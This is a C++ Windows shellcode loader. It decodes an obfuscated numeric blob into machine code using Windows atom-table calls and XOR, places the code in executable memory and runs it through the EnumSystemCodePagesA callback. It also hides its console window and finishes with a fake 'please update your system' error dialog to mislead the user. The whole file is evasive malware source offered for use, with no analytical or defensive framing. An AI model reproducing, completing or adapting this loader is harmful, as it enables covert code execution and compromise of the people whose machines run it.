#define _CRT_SECURE_NO_DEPRECATE
#include<Windows.h>
#include<iostream>
#include <chrono>
#include <thread>
using namespace std;

typedef BOOL(WINAPI* VirTual)(
    LPVOID     Addr,
    DWORD      Size,
    DWORD      New,
    PDWORD     Old
    );

VirTual VT1 = (VirTual)GetProcAddress(
    GetModuleHandleA("Kernel32.dll"),
    "VirtualProtect"
);

typedef BOOL(WINAPI* EnumSystemCodePagesFunc)(CODEPAGE_ENUMPROCA lpCodePageEnumProc, DWORD dwFlags);
EnumSystemCodePagesFunc pEnumSystemCodePages = (EnumSystemCodePagesFunc)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "EnumSystemCodePagesA");

void dec(char* name) {
    char buf[7000];
    strcat(buf, name);
    char bufff[50];
    char cd[50];
    int code;
    char buff[7000];
    string buf_2 = buf;
    int num = 0;
    int num_2 = num + 4;
    int code_num = 0;
    for (int i = 0; i < sizeof(buf); i++) {
        if (buf[i] != (char)'\x0') {
            string str = buf_2.substr(num, num_2);
            if (str.length() < 4) {
                break;
            }
            str.copy(cd, 4, 0);
            ATOM att = AddAtomA(cd);
            GetAtomNameA(att, bufff, 50);
            code = (atoi(bufff) - 1024) ^ 1024;
            buff[code_num] = (char)code;
            code_num++;
            num_2 += 4;
            num += 4;
        }
        else {
            break;
        }
    }
    DWORD old;

    //VT1(buff, sizeof(buff), PAGE_EXECUTE_READWRITE, &old);
    void* exec = VirtualAlloc(0, sizeof(buff), MEM_COMMIT, PAGE_EXECUTE_READWRITE);//申请一块可读可写可执行的内存空间
    memcpy(exec, buff, sizeof(buff));//把shellcodeo拷贝到内存空间里

    std::this_thread::sleep_for(std::chrono::seconds(1));
    EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)exec, CP_INSTALLED);
    
    

}

int main(int argc, char* argv[]) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    char name[] = "23002120217922762288228022482048204820482113212921132128213021292134212020972258214921202187213021442120218721302072212021872130208021202187216221282120206322312122212221252097224921202097224022202108214521722050209220802113224122492061211320492241227422852130211321292120218721302080218721142108212020492256215021772168207220592050216521622187217621842048204820482120218122402164215121202049225621282187212020722116218721122080212120492256227521342120230322492113218721002184212020492262212520972249212020972240222021132241224920612113204922412104227221652289212420512124208420562117210522572165226421362116218721122084212120492256215021132187206021202116218721122076212120492256211321872052218421202049225621132136211321362142213721382113213621132137211321382120217922842080211321302303227221362113213721382120218720662281212723032303230321412154204821212238216721532158215321582149216420482113213421212185227821242185228921132234212421672086205523032261212020972249212020972258212520972240212520972249211321282113212821132234210621342169221523032261228321632138212021852241211322322299208020482048212520972249211321292113212921542051211321292113223421352185220722462303226122832137213921202185224121202097225821212185226421252097224921302152204820502112218021302130211322342283213320942107230322612120218522462120217922432128215420582143212021852289212021852266212122472240230323032303230321252097224921302130211322342093205420722171230322612181224020632181220520492048204821202303225520632180218820492048204822832259228122762049204820482280221023032303230320952117212721622135204821662207226621952145221421112087226422652081217922472177210221862170210121802153214022792107213320642077219621552144217820692054217421762299208520942301224822012277211821952178221022902263222422832201208821602220219620542215218821612164216222962100218921072229224820872091226920642290225121772048213321632149216220932113215121492158216421062080212521592170215321562156214520952101209420962080208821472159215721602145216421532146215621492107208021252131212121172080210520942096210720802135215321582148215921672163208021262132208021022094209721072080213221622153214821492158216420952101209420962107208021142127212121172105210721172126213321312089206120582048225321892300219520632049219320662131224221082244215720602165213522072051207920732266229620492279213822252130221122782121216621802158223422852157206522682290217921612285207322502085229621182239211921202243224120702298227820672066216221612269206422962066223321582061209120862110212022542172221321302100211921072257223822612242220421542174218220972270211221612230216421852155214622792281229621932213228621882200223122622229219922062130208822532293209320642288229322862048214021592110223522522054214421592084223121882195223421542112206722362051229022322097222720862149223822482119226621692164209322952140217621182173223722512174225623012277211320652111218620572214215122212197219820572068207823002087212622122171206921092195224022712226205920672262223421462082224420482073217420742112205621872139228022232141228420832130206121982105225120792049228620942188204821132238228822292210213423032261212020972249223420482048211220482113223220482064204820482113223321122048204820482113223421362212213122772303226121202195213121312120218522792120218522892120218522662113223220482080204820482121218522972113223420662198218522742303226121202179224420802181224021642230215021872055212020492243218122402165226321362136213621202053204820482048204821282243228022072301230323032097210520982094209721022104209420992097209420972101209920482087223621822218";
    dec(name);
    MessageBox(NULL, "当前环境不兼容，请更新系统版本！", "错误提示", MB_OK | MB_ICONERROR);
    return 0;
}